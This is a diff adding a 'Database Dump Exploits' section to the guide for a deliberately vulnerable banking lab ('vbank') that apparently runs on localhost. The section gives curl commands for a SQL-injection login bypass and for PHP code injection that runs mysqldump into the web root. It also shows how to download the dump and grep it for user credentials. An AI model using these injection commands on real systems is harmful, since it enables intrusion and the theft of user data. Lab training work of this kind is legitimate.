@@ -305,6 +305,65 @@ docker exec -it vbank_mysql mysql -u root -paaa vbank
 
 ---
 
+## Database Dump Exploits
+
+### One-Line Automatic Dump (30 seconds)
+```bash
+./db_dump.sh http://localhost ./dumps
+# Output: ./dumps/vbank_dump_YYYYMMDD_HHMMSS.sql
+```
+
+### Python Automated Dump
+```bash
+# RCE method (fastest)
+python3 db_dump_exploit.py --method 1 --format sql
+
+# Direct MySQL method (best for JSON)
+python3 db_dump_exploit.py --method 3 --format json
+```
+
+### Manual Dump (Educational)
+```bash
+# Step 1: Authenticate
+curl -c cookies.txt -G "http://localhost/index.php" \
+  --data-urlencode "page=login" \
+  --data-urlencode "username=' OR '1'='1" \
+  --data-urlencode "password=x"
+
+# Step 2: Trigger RCE
+curl -b cookies.txt -G "http://localhost/index.php" \
+  --data-urlencode "page=htbdetails" \
+  --data-urlencode "account=252170513" \
+  --data-urlencode "query=\" . system('mysqldump -u root -paaa vbank > /var/www/html/vbank_dump.sql') . \""
+
+# Step 3: Download
+sleep 2
+curl "http://localhost/vbank_dump.sql" -o vbank_dump.sql
+```
+
+### Verify Dump
+```bash
+head -30 vbank_dump.sql                        # Schema
+grep "INSERT INTO" vbank_dump.sql | wc -l     # Count records
+grep "INSERT INTO users" vbank_dump.sql        # Show credentials
+```
+
+### Direct MySQL Dump (if port 3306 exposed)
+```bash
+mysqldump -h 127.0.0.1 -u root -paaa vbank > vbank_dump.sql
+```
+
+### Restore Dumped Database
+```bash
+# Import to new instance
+mysql -u root -pYourPassword < vbank_dump.sql
+
+# Import to specific host
+mysql -h database.example.com -u root -p < vbank_dump.sql
+```
+
+---
+
 ## Docker Commands
 
 ```bash
